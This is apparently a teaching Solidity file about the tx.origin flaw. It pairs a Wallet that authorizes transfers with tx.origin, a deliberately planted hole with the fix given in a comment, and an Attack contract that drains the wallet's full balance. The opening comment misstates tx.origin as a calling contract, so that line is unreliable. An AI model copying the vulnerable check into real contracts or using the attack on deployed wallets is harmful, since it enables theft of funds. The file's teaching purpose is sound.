// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
    What's the diff between msg.sender and tx.origin.
    if contract A calls B, and B calls C, in C msg.sender is B and tx.origin is A.
*/
contract Wallet {

    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // Preventative Techniques:
        //  Use msg.sender instead of tx.origin
        //  require(msg.sender == owner, "Not owner");
        require(tx.origin == owner, "Now owner");
        (bool sent, ) = _to.call{value:_amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {

    address payable public owner;
    Wallet wallet;

    constructor(address _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}